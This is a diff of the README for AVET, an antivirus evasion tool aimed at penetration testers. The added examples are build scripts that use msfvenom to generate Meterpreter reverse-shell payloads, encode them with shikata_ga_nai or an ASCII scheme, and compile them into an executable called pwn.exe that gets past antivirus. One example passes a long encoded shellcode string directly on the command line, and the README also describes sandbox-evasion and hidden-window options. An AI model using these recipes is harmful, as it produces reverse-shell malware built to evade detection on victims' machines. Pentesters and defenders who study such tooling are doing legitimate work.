@@ -4,11 +4,12 @@ AntiVirus Evasion Tool
 AVET is an AntiVirus Evasion Tool, which was developed for making life easier for pentesters and for experimenting with antivirus evasion techniques.
 In version 1.2 new stuff was introduced, for a complete overview have a look at the CHANGELOG file.
 
-For basics about antivirus evasion & AVET have a look here: 
+For basics about antivirus evasion, AVET & more information have a look here: 
 - https://govolution.wordpress.com/2017/07/27/paper-avet-blackhat-usa-2017/
 - https://govolution.wordpress.com/2017/06/11/avet-video/
 - https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf
 - https://deepsec.net/docs/Slides/2014/Why_Antivirus_Fails_-_Daniel_Sauder.pdf
+- https://twitter.com/DanielX4v3r
 
 What & Why:
 - when running an exe file made with msfpayload & co, the exe file will often be recognized by the antivirus software
@@ -16,6 +17,7 @@ What & Why:
 - assembly shellcodes can be used
 - make_avet can be used for configuring the sourcecode
 - with make_avet you can load ASCII encoded shellcodes from a textfile or from a webserver, further it is using an av evasion technique to avoid sandboxing and emulation
+- call msf ASCII encoded shellcode as a parameter from cmd
 - for ASCII encoding the shellcode the tool format.sh and sh_format are included
 - this readme applies for Kali 2 (64bit) and tdm-gcc
 
@@ -25,7 +27,7 @@ https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/
 
 How to use make_avet and build scripts
 --------------------------------------
-Compile if needed:
+Compile if needed, for example if you use a 32 bit system:
 ```
 $ gcc -o make_avet make_avet.c
 ```
@@ -34,14 +36,24 @@ The purpose of make_avet is to preconfigure a definition file (defs.h) so that t
 
 Let's have a look at the options from make_avet, examples will be given below:
 -l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt
+
 -f compile shellcode into .exe, needs filename of shellcode file
+
 -u load and exec shellcode from url using internet explorer (url is compiled into executable)
+
 -E use avets ASCII encryption, often do not has to be used
    Note: with -l -E is mandatory
+   
 -F use fopen sandbox evasion
+
 -X compile for 64 bit
+
 -p print debug information
+
+-q quiet mode (hide windows)
+
 -h help
+
 
 Of course it is possible to run all commands step by step from command line. But it is strongly recommended to use build scripts or the avet_fabric.py.
 
@@ -54,6 +66,48 @@ Here are some explained examples for building the .exe files from the build dire
 
 
 Example 1
+---------
+In this example the evasion technique is simple. The shellcode is encoded with 20 rounds of 
+shikata-ga-nai, often enough that does the trick (note: Now it might be more ;) ). This technique is pretty similar to a junk loop. Execute so much code that the AV engine breaks up execution and let the file pass.
+
+```
+#!/bin/bash          
+# simple example script for building the .exe file
+# include script containing the compiler var $win32_compiler
+# you can edit the compiler in build/global_win32.sh
+# or enter $win32_compiler="mycompiler" here
+. build/global_win32.sh
+# make meterpreter reverse payload, encoded 20 rounds with shikata_ga_nai
+msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.128 lport=443 -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > sc.txt
+# call make_avet, the sandbox escape is due to the many rounds of decoding the shellcode
+./make_avet -f sc.txt
+# compile to pwn.exe file
+$win32_compiler -o pwn.exe avet.c
+# cleanup
+echo "" > defs.h
+```
+
+Example 2, 64bit payloads
+-------------------------
+Great to notice that still for 64bit payload no further evasion techniques has to be used. But -F should work here too.
+
+```
+#!/bin/bash          
+# simple example script for building the .exe file
+. build/global_win64.sh
+# make meterpreter reverse payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.132 lport=443 -f c --platform Windows > sc.txt
+# format the shellcode for make_avet
+./format.sh sc.txt > scclean.txt && rm sc.txt
+# call make_avet, compile 
+./make_avet -f scclean.txt -X -E
+$win64_compiler -o pwn.exe avet.c
+# cleanup
+rm scclean.txt && echo "" > defs.h
+```
+
+
+Example 3
 ---------
 Compile shellcode into the .exe file and use -F as evasion technique. Note that this example will work for most antivirus engines. Here -E is used for encoding the shellcode as ASCII.
 
@@ -77,46 +131,6 @@ $win32_compiler -o pwn.exe avet.c
 rm scclean.txt && echo "" > defs.h
 ```
 
-Example 2
----------
-Usage without -E. The ASCII encoder does not have to be used, here is how to compile without -E. In this example the evasion technique is quit simple! The shellcode is encoded with 20 rounds of 
-shikata-ga-nai, often enough that does the trick. This technique is pretty similar to a junk loop. Execute so much code that the AV engine breaks up execution and let the file pass.
-
-```
-#!/bin/bash          
-# simple example script for building the .exe file
-# include script containing the compiler var $win32_compiler
-# you can edit the compiler in build/global_win32.sh
-# or enter $win32_compiler="mycompiler" here
-. build/global_win32.sh
-# make meterpreter reverse payload, encoded 20 rounds with shikata_ga_nai
-msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.128 lport=443 -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > sc.txt
-# call make_avet, the sandbox escape is due to the many rounds of decoding the shellcode
-./make_avet -f sc.txt
-# compile to pwn.exe file
-$win32_compiler -o pwn.exe avet.c
-# cleanup
-echo "" > defs.h
-```
-
-Example 3, 64bit payloads
--------------------------
-Great to notice that still for 64bit payload no further evasion techniques has to be used. But -F should work here too.
-
-```
-#!/bin/bash          
-# simple example script for building the .exe file
-. build/global_win64.sh
-# make meterpreter reverse payload
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.132 lport=443 -f c --platform Windows > sc.txt
-# format the shellcode for make_avet
-./format.sh sc.txt > scclean.txt && rm sc.txt
-# call make_avet, compile 
-./make_avet -f scclean.txt -X -E
-$win64_compiler -o pwn.exe avet.c
-# cleanup
-rm scclean.txt && echo "" > defs.h
-```
 
 Example 4, load from a file
 ---------------------------
@@ -165,6 +179,26 @@ echo " " > defs.h
 # now copy scclean.txt to your web root and start 
 ```
 
+
+Example 6, call shellcode as a parameter
+----------------------------------------
+It is possible to load shellcode as a parameter from cmd like:
+```
+C:\> pwn.exe PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYlzHOrgpwpEPapLIheeaIPrDLKRp00NkV26lnkCbUDlK0r4OMg0JtfEaKONLWLe1aldBTlWPo1hOVmFa8GZBJRsbRwLKPRVplKqZ7LnkRlB1CHhc2hS1Jq3alKf9Q0GqICnkG97hhcfZaYnkttlKfaJvuayoNLZaJoFm31JgehKPaeYf4CamHx7KSM5t2UzDbxlKBxFDFaKcE6lK6lpKlKshELWqKcLKeTNkFaHPni1Ta4dd3k1KaqBy2zF1ioM0qOQOpZlKR2XkLMQMphPn3UT4uPsXqgQypnQy1DcXBlqgUvFgioZuDqKkRs0SBssccc3XFZ66RYI7KO9EaCpS0jtCf3v3SXoKva30309xKtuPs07pfOabF8rlcopdG3VUrK0n07BMVYSQE2T8ROGEPOPLphP8e7du0iqj3osISqBR0grC2tCfroef1aRU1OblRMqzd1UaBx737D1OW1dpv9fV7pv0SXv7k9mOkvYokeniXFF32HEPEbM0MT63v3bsaGaCsfSXJKV5DnWKKOiENv1zgzaOE8opp3S0wpMY9p1z3460SZGorvU8CEBfMNOvkOyE1CpSaC2spVqxVMtF7hCK9oXUNekpCE5DU8OxGcc0EPaxStZPVUM0kOjupO45xMyx0LePEPWp1zspQxWpR0uPS0u8c030aPc0bs3X68i42sHeioiENs2sBsOyHgrwqxEPa0eP30v3V6cXuBofNiZByo8UmUIP448ONkFg5QO3NeKpT5Iuv8O3CojHrKYo9oyop1DyEbFNfQtvGHVNDqUafVDnubDpuhUPoKxpH5i2sf2JC0sc9ohUAA
+```
+An example makefile is: build/build_win32_meterpreter_rev_https_ASCIIMSF_cmd.sh
+
+
+Example 7, use the "killswitch" sandbox evasion technique
+---------------------------------------------------------
+This technique is using the gethostbyname command. See help from make_avet, for an example please refer:
+build/build_win32_meterpreter_rev_https_killswitch_shikata.sh
+
+
+Example 8, quite mode
+---------------------
+With the quite mode the cmd window is hidden. For an example see:
+build/build_win32_meterpreter_rev_https_fopen_shikata_quiet.sh
 
 
 avet_fabric.py
